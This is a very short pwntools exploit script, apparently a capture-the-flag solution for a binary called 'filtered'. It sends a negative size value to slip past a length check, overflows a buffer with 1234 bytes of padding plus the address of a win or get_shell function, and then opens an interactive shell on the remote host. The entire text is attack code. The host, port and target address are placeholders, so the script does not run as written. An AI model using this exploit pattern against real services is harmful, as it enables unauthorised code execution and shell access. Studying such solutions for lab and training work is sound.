from pwn import *
p = remote("host", port)        ## p = process ("./filtered")
p.recvuntil("Size: ")
p.sendline("-1")
p.recvuntil("Data: ")
p.sendline(b'A'*1234+p64(win_functon_addr))   ## or get_shell
p.interactive()    ## interv and get result
